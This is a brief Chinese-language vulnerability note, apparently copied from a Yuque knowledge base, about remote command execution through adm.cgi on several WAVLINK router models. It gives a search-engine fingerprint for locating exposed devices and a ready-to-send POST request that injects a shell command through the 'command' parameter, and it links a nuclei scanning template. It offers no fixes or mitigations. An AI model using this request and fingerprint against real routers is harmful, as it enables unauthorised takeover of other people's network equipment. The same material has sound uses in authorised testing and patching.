# WAVLINK adm.cgi命令执行漏洞

# 一、漏洞简介
WAVLINK是中国睿因科技（WAVLINK）公司开发的一款路由器，该系统adm.cgi文件存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。包含型号WN530HG4、WN531G3、WN572HG3、WN535G3、WN575A4等。

# 二、影响版本
+ wavlink 路由器

# 三、资产测绘
+ hunter`web.body="firstFlage"`
+ 特征

![1703226837131-abc67852-1626-482a-982b-2f8f69837f2c.png](./img/g25y0jJy9HEuSzIf/1703226837131-abc67852-1626-482a-982b-2f8f69837f2c-154106.png)

# 四、漏洞复现
```java
POST /cgi-bin/adm.cgi HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

page=sysCMD&command=";id;"
```

![1703227525600-a2c72405-b4ed-41d9-b3a9-5fcaf6b9bb7e.png](./img/g25y0jJy9HEuSzIf/1703227525600-a2c72405-b4ed-41d9-b3a9-5fcaf6b9bb7e-661984.png)

nuclei脚本

[wanlink-router-adm-cgi-rce.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222231419-b11f1277-6ff4-4254-8a64-b9fd783e0f85.yaml)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ur96lfz8saqpabto>